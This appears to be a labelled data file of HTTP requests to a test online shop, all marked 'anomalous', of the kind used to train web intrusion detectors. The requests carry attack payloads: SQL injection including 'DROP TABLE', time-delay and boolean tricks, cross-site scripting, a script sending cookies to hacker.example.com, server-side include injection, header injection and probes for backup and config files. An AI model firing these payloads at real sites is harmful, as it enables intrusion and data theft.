GET,http://localhost:8080.inc,,anomalous
GET,http://localhost:8080/tienda1/miembros/imagenes/asf-logo-wide.gif/.Old,,anomalous
GET,http://localhost:8080/WEB-INF/webapp.properties,,anomalous
GET,http://localhost:8080/tienda1/miembros/index.jsp.Inc,,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=melonie&password=ad1168n77&nombre=Dulio&apellidos=Ubach+Rodr%EDguez&email=wilmot%40schnaps.com.ne&dni=87584326G&direccion=C%2F+Lara%2C+162+&ciudad=Villanueva+de+Campe%E1n&cp=01423&provincia=Barcelona%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&ntc=5124736256894307&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=melonie&password=ad1168n77&nombre=Dulio&apellidos=Ubach+Rodr%EDguez&email=wilmot%40schnaps.com.ne&dni=87584326G&direccion=C%2F+Lara%2C+162+&ciudad=Villanueva+de+Campe%E1n&cp=01423&provincia=Barcelona%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&ntc=5124736256894307&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=melonie&password=ad1168n77&nombre=Dulio&apellidos=Ubach+Rodr%EDguez&email=wilmot%40schnaps.com.ne&dni=87584326G&direccion=C%2F+Lara%2C+162+&ciudad=Villanueva+de+Campe%E1n&cp=%22+AND+%221%22%3D%221&provincia=Barcelona&ntc=5124736256894307&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=melonie&password=ad1168n77&nombre=Dulio&apellidos=Ubach+Rodr%EDguez&email=wilmot%40schnaps.com.ne&dni=87584326G&direccion=C%2F+Lara%2C+162+&ciudad=Villanueva+de+Campe%E1n&cp=%22+AND+%221%22%3D%221&provincia=Barcelona&ntc=5124736256894307&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=melonie&password=ad1168n77&nombre=Dulio&apellidos=Ubach+Rodr%EDguez&email=wilmot%40schnaps.com.ne&dni=87584326G&direccion=C%2F+Lara%2C+162+&ciudad=Villanueva+de+Campe%E1n&cp=01423&provinciaA=Barcelona&ntc=5124736256894307&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=melonie&password=ad1168n77&nombre=Dulio&apellidos=Ubach+Rodr%EDguez&email=wilmot%40schnaps.com.ne&dni=87584326G&direccion=C%2F+Lara%2C+162+&ciudad=Villanueva+de+Campe%E1n&cp=01423&provinciaA=Barcelona&ntc=5124736256894307&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/asf-logo-wide,,anomalous
GET,http://localhost:8080/WebSphereSamples/SingleSamples/AccountAndTransfer/create.html,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=100Set-cookie%253A%2BTamper%253D1041264011025374727&cantidad=18&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Vino+Rioja&precio=100Set-cookie%253A%2BTamper%253D1041264011025374727&cantidad=18&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=100&cantidad=%3F&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Vino+Rioja&precio=100&cantidad=%3F&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=85%2F&cantidad=18&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Vino+Rioja&precio=85%2F&cantidad=18&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombreA=Vino+Rioja&precio=100&cantidad=18&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombreA=Vino+Rioja&precio=100&cantidad=18&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&pwd=COnSO0atiVO&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&pwd=COnSO0atiVO&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ke%2B%3Fv%3Fen&pwd=COnSO0atiVO&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=ke%2B%3Fv%3Fen&pwd=COnSO0atiVO&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp.Inc,,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=2,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27+AND+%271%27%3D%271,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas%27+AND+%271%27%3D%271,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2103&B1=Confirmar%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=2103&B1=Confirmar%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=2103&B1=Pasar+por+caja,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precioA=2103&B1=Pasar+por+caja,anomalous
GET,http://localhost:8080/?Open,,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=charlesb&password=m96fan19&nombre=Durante&apellidos=Campusano+Caldero&email=gheorghiu-battaglia%40sanchezgordo.bt&dni=44335499D&direccion=C%2F+Padre+Luis+Maria+Arteche+0+5B&ciudad=Palma+de+Mallorca&cp=37716&provincia=Cantabria%2B&ntc=6556979183874771&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=charlesb&password=m96fan19&nombre=Durante&apellidos=Campusano+Caldero&email=gheorghiu-battaglia%40sanchezgordo.bt&dni=44335499D&direccion=C%2F+Padre+Luis+Maria+Arteche+0+5B&ciudad=Palma+de+Mallorca&cp=37716&provincia=Cantabria%2B&ntc=6556979183874771&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=charlesb&password=m96fan19&nombre=Durante&apellidos=Campusano+Caldero&email=gheorghiu-battaglia%40sanchezgordo.bt&dni=44335499D&direccion=C%2F+Padre+Luis+Maria+Arteche+0+5B&ciudad=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&cp=37716&provincia=Cantabria&ntc=6556979183874771&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=charlesb&password=m96fan19&nombre=Durante&apellidos=Campusano+Caldero&email=gheorghiu-battaglia%40sanchezgordo.bt&dni=44335499D&direccion=C%2F+Padre+Luis+Maria+Arteche+0+5B&ciudad=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&cp=37716&provincia=Cantabria&ntc=6556979183874771&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&loginA=charlesb&password=m96fan19&nombre=Durante&apellidos=Campusano+Caldero&email=gheorghiu-battaglia%40sanchezgordo.bt&dni=44335499D&direccion=C%2F+Padre+Luis+Maria+Arteche+0+5B&ciudad=Palma+de+Mallorca&cp=37716&provincia=Cantabria&ntc=6556979183874771&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&loginA=charlesb&password=m96fan19&nombre=Durante&apellidos=Campusano+Caldero&email=gheorghiu-battaglia%40sanchezgordo.bt&dni=44335499D&direccion=C%2F+Padre+Luis+Maria+Arteche+0+5B&ciudad=Palma+de+Mallorca&cp=37716&provincia=Cantabria&ntc=6556979183874771&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp.BAK,,anomalous
GET,http://localhost:8080/tienda1/global/menum.jsp.Old,,anomalous
GET,http://localhost:8080/asf-logo-wide,,anomalous
GET,http://localhost:8080/tienda1/miembros/imagenes/asf-logo-wide.java,,anomalous
GET,http://localhost:8080/asf-logo-wide.BAK,,anomalous
GET,http://localhost:8080/scripts/tools/mkilog.exe,,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=han-fei&password=esPUeNdA&nombre=%3FBa.s-iana&apellidos=Barril+Scifo&email=noel-noel.abel-gance%40videocasa-ebs.yu&dni=88159654X&direccion=Calle+Luis+i+165+10A&ciudad=Castrillo+de+la+Guare%F1a&cp=43830&provincia=Albacete&ntc=6015225993356578&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=han-fei&password=esPUeNdA&nombre=%3FBa.s-iana&apellidos=Barril+Scifo&email=noel-noel.abel-gance%40videocasa-ebs.yu&dni=88159654X&direccion=Calle+Luis+i+165+10A&ciudad=Castrillo+de+la+Guare%F1a&cp=43830&provincia=Albacete&ntc=6015225993356578&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modoA=registro&login=han-fei&password=esPUeNdA&nombre=Sartino&apellidos=Barril+Scifo&email=noel-noel.abel-gance%40videocasa-ebs.yu&dni=88159654X&direccion=Calle+Luis+i+165+10A&ciudad=Castrillo+de+la+Guare%F1a&cp=43830&provincia=Albacete&ntc=6015225993356578&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modoA=registro&login=han-fei&password=esPUeNdA&nombre=Sartino&apellidos=Barril+Scifo&email=noel-noel.abel-gance%40videocasa-ebs.yu&dni=88159654X&direccion=Calle+Luis+i+165+10A&ciudad=Castrillo+de+la+Guare%F1a&cp=43830&provincia=Albacete&ntc=6015225993356578&B1=Registrar,anomalous
GET,http://localhost:8080/iisadmin/htmldocs/iisdocs.htm,,anomalous
GET,http://localhost:8080/tienda1/index.jsp~,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100%2F&cantidad=38&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Jam%F3n+Ib%E9rico&precio=100%2F&cantidad=38&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidadA=38&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidadA=38&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kenkel&pwd=ad5er4r%2500&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=kenkel&pwd=ad5er4r%2500&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kenkel&pwd=%2520&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=kenkel&pwd=%2520&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kenkel&pwd=ad5er4r&remember=on%2F&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=kenkel&pwd=ad5er4r&remember=on%2F&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kenkel&pwd=ad5er4r&rememberA=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=kenkel&pwd=ad5er4r&rememberA=on&B1=Entrar,anomalous
PUT,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=1,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=1,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp.INC,,anomalous
GET,http://localhost:8080/iisadmpwd/aexp4.htr,,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27+AND+%271%27%3D%271,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas%27+AND+%271%27%3D%271,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp.Inc,,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9168%257C&B1=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=9168%257C&B1=Confirmar,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9168&B1=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=9168&B1=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9168&B1=Confirmar%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=9168&B1=Confirmar%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=9168&B1=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modoA=insertar&precio=9168&B1=Confirmar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=%7C&login=denna&password=89S0R56Gl8&nombre=Reynard&apellidos=H%E9rard&email=bardy%40busquedadeempleo.mw&dni=18720571C&direccion=Ordo%F1ez+31%2C+4%3FG&ciudad=Vinuesa&cp=50584&provincia=Zaragoza&ntc=0820484159407817&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=%7C&login=denna&password=89S0R56Gl8&nombre=Reynard&apellidos=H%E9rard&email=bardy%40busquedadeempleo.mw&dni=18720571C&direccion=Ordo%F1ez+31%2C+4%3FG&ciudad=Vinuesa&cp=50584&provincia=Zaragoza&ntc=0820484159407817&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=denna&password=89S0R56Gl8&nombre=Deni%3F%27%3Fce&apellidos=H%E9rard&email=bardy%40busquedadeempleo.mw&dni=18720571C&direccion=Ordo%F1ez+31%2C+4%3FG&ciudad=Vinuesa&cp=50584&provincia=Zaragoza&ntc=0820484159407817&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=denna&password=89S0R56Gl8&nombre=Deni%3F%27%3Fce&apellidos=H%E9rard&email=bardy%40busquedadeempleo.mw&dni=18720571C&direccion=Ordo%F1ez+31%2C+4%3FG&ciudad=Vinuesa&cp=50584&provincia=Zaragoza&ntc=0820484159407817&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&loginA=denna&password=89S0R56Gl8&nombre=Reynard&apellidos=H%E9rard&email=bardy%40busquedadeempleo.mw&dni=18720571C&direccion=Ordo%F1ez+31%2C+4%3FG&ciudad=Vinuesa&cp=50584&provincia=Zaragoza&ntc=0820484159407817&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&loginA=denna&password=89S0R56Gl8&nombre=Reynard&apellidos=H%E9rard&email=bardy%40busquedadeempleo.mw&dni=18720571C&direccion=Ordo%F1ez+31%2C+4%3FG&ciudad=Vinuesa&cp=50584&provincia=Zaragoza&ntc=0820484159407817&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carritoAND+1%3D1,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carritoAND+1%3D1,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp/,,anomalous
GET,http://localhost:8080/tienda1/6909030637832563290.jsp.inc,,anomalous
GET,http://localhost:8080/WebSphereSamples/SingleSamples/Increment/increment.html,,anomalous
GET,http://localhost:8080/samples/dbsamp/dbsamp2.htm,,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mau%2Brino&password=Desaprovedhosa&nombre=Guy&apellidos=Peruyero+Danis&email=sundbery-vonic%40castigado.tf&dni=61857027E&direccion=C%2F+Jose+Maria+Pereda%2C+49+&ciudad=Chodes&cp=12319&provincia=Albacete&ntc=8340633556666736&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=mau%2Brino&password=Desaprovedhosa&nombre=Guy&apellidos=Peruyero+Danis&email=sundbery-vonic%40castigado.tf&dni=61857027E&direccion=C%2F+Jose+Maria+Pereda%2C+49+&ciudad=Chodes&cp=12319&provincia=Albacete&ntc=8340633556666736&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=eiko&password=Desaprovedhosa&nombre=Guy&apellidos=Peruyero+Danis&email=sundbery-vonic%40castigado.tf&dni=61857027E&direccion=C%2F+Jose+Maria+Pereda%2C+49+&ciudad=Chodes&cpA=12319&provincia=Albacete&ntc=8340633556666736&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=eiko&password=Desaprovedhosa&nombre=Guy&apellidos=Peruyero+Danis&email=sundbery-vonic%40castigado.tf&dni=61857027E&direccion=C%2F+Jose+Maria+Pereda%2C+49+&ciudad=Chodes&cpA=12319&provincia=Albacete&ntc=8340633556666736&B1=Registrar,anomalous
GET,http://localhost:8080/asf-logo-wide.Old,,anomalous
GET,http://localhost:8080/tienda1/4861362529278789730,,anomalous
GET,http://localhost:8080/tienda1/imagenes/3.gif/4861362529278789730.OLD,,anomalous
GET,http://localhost:8080/tienda1/imagenes/cmenbul.gif/asf-logo-wide,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=85paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&cantidad=34&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Jam%F3n+Ib%E9rico&precio=85paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&cantidad=34&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=Set-cookie%253A%2BTamper%253D1041264011025374727&cantidad=34&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Jam%F3n+Ib%E9rico&precio=Set-cookie%253A%2BTamper%253D1041264011025374727&cantidad=34&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100%2F&cantidad=34&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Jam%F3n+Ib%E9rico&precio=100%2F&cantidad=34&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombreA=Jam%F3n+Ib%E9rico&precio=85&cantidad=34&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombreA=Jam%F3n+Ib%E9rico&precio=85&cantidad=34&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp/6909030637832563290.jsp,,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=rocio4&pwd=acreCenTA%21Dora&remember=onany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=rocio4&pwd=acreCenTA%21Dora&remember=onany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=rocio4&pwd=deSm%27Elar&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=rocio4&pwd=deSm%27Elar&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=1,anomalous
GET,http://localhost:8080/tienda1/publico/carrito.jsp/asf-logo-wide.gif/,,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%2B,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas%2B,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
PUT,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=1510&B1=Confirmar,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1510%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&B1=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=1510%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&B1=Confirmar,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=%3F&precio=1510&B1=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=%3F&precio=1510&B1=Confirmar,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1510&B1=Confirmar%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=1510&B1=Confirmar%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1510&B1A=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=1510&B1A=Confirmar,anomalous
GET,http://localhost:8080.BAK,,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tarle&password=8ar0enaDor&nombre=Romildo&apellidos=Decaralt+Melero&email=nye%40intg.ws&dni=%27961066AD&direccion=Pl.+De+La+Muralla+Liberal+169+2%3FB&ciudad=Almensilla&cp=47513&provincia=Girona&ntc=9922927157537340&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=tarle&password=8ar0enaDor&nombre=Romildo&apellidos=Decaralt+Melero&email=nye%40intg.ws&dni=%27961066AD&direccion=Pl.+De+La+Muralla+Liberal+169+2%3FB&ciudad=Almensilla&cp=47513&provincia=Girona&ntc=9922927157537340&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tarle&password=8ar0enaDor&nombre=Romildo&apellidos=Decaralt+Melero&email=nye%40intg.ws&dni=92321751G&direccion=Pl.+De+La+Muralla+Liberal+169+2%3FB&ciudadA=Almensilla&cp=47513&provincia=Girona&ntc=9922927157537340&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=tarle&password=8ar0enaDor&nombre=Romildo&apellidos=Decaralt+Melero&email=nye%40intg.ws&dni=92321751G&direccion=Pl.+De+La+Muralla+Liberal+169+2%3FB&ciudadA=Almensilla&cp=47513&provincia=Girona&ntc=9922927157537340&B1=Registrar,anomalous
GET,http://localhost:8080/iisstart.asp,,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp/asf-logo-wide.gif.BAK,,anomalous
GET,http://localhost:8080/tienda1/4861362529278789730,,anomalous
GET,http://localhost:8080/tienda1/4861362529278789730.Inc,,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=bennet&password=%2496c5sa&nombre=Sid&apellidos=Echegoyen+Pazar%E1n&email=senghor-golling3%4024htranslations.ht&dni=16864786J&direccion=Barriada+De+La+Doctora+15+&ciudad=Roa&cp=03610%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&provincia=Valladolid&ntc=0695001148270797&B1=Registrar,,anomalous
